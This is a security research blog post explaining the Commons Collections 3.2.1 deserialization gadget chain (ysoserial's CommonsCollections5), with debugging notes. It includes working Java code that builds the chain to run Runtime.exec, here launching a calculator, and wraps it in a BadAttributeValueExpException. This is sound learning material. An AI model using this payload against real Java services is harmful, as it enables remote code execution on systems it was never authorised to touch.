---
layout: post
title:  "Analyze Java deserialization gadget chains - For learning purpose"
date:   2022-01-19 16:00:00 +0700
categories: research
author: Quang Vo
tags: java, deserialization
description: Research
---

## Introduction 
Most of people have heard about Java deserialization apocalypse. There are great tools out there for hunting deserialization vulnerabilities out there, to name a fews:
- The famous [ysoserial](https://github.com/frohoff/ysoserial)
- The same [ysoserial](https://github.com/pwntester/ysoserial.net) but for C# .NET
- [Gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector)

While in those tools, payloads are already there for us to use. But I believe the best way to learn and remember what we learnt are by actually understanding it, that's why I write this blog, to help me remember and understand it more and also for who want to know about this.

In this blog, we are going to dive in some of the famous gadget chain to see what's in there and how it's work.

IDE I use in this blog will be [IntelliJ IDEA Ultimate](https://www.jetbrains.com/idea/) so that we can debug line by line of codes, you can use the community version, it's fine.

## CommonsCollections gadget chain

In ysoserial, there are 7 different gadget chains relate to `CommonsCollection` . In this blog post, I'll use `commons-collection version 3.2.1` .

Here is what the gadget chain look like from `ysoserial` : 

```java
BadAttributeValueExpException.readObject()
  TiedMapEntry.toString()
    TiedMapEntry.getValue()
      LazyMap.get()
        ChainedTransformer.transform()
          ConstantTransformer.transform()
          InvokerTransformer.transform()
            Method.invoke()
              Class.getMethod()
          InvokerTransformer.transform()
            Method.invoke()
              Runtime.getRuntime()
          InvokerTransformer.transform()
            Method.invoke()
```

I write some Java code to invoke the gadget chain and start to debug it:
```java
   public static void CommonsCollections5() throws IllegalAccessException, NoSuchFieldException {

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"gnome-calculator"})});
        HashMap innerMap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innerMap,chain);
        TiedMapEntry tiedMap = new TiedMapEntry(map,123);
        tiedMap.toString();

        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);

        Field fi = poc.getClass().getDeclaredField("val");
        fi.setAccessible(true);
        fi.set(poc, tiedMap);
    }
```

The gadget chain start at `BadAttributeValueExpException.readObject()`

Content of `BadAttributeValueExpException.readObject()`

![image](https://user-images.githubusercontent.com/37280106/150266360-12b657d4-9f5a-45ee-aa0f-dccd4bd4a735.png)

We will place breakpoint at `LazyMap.get()` method to start debugging this gadget chain

![image](https://user-images.githubusercontent.com/37280106/150266663-855ce765-8fcb-488e-88d8-e71c93f271bf.png)

Why do I place breakpoint at `LazyMap.get()` method ?. 

That is because if we place breakpoint at `BadAttributeValueExpException.readObject()` or `TiedMapEntry.toString()` or `TiedMapEntry.getValue()` method.
IntelliJ IDEA Debugger will execute the payload and pop calc before we go all the way down to the gadget chain, I guess during the Debugger session, IntelliJ IDEA has invoked methods beforehand to get us the local variables's value, so the payload has been executed.




